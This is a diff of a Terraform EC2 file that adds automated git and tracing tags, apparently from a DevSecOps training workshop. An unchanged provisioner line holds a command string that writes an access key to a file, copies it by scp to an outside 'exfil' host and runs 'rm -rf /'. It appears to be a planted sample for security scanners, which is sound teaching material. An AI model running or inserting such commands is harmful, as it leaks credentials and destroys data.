@@ -10,4 +10,15 @@ resource "aws_ec2_host" "test" {
     command = "echo Running install scripts.. 'echo $ACCESS_KEY > creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /'   "
   }
 
+  tags = {
+    git_commit           = "d4c35e0270bfd542051278ca30b4b3872c1ae0b2"
+    git_file             = "code/simple_ec2.tf"
+    git_last_modified_at = "2024-01-26 23:01:56"
+    git_last_modified_by = "tprendervill@paloaltonetworks.com"
+    git_modifiers        = "tprendervill"
+    git_org              = "devsecops-workshop-aug24"
+    git_repo             = "prisma-cloud-devsecops-workshop"
+    yor_name             = "test"
+    yor_trace            = "f348be02-03e1-4eb3-87a4-efea1522d359"
+  }
 }
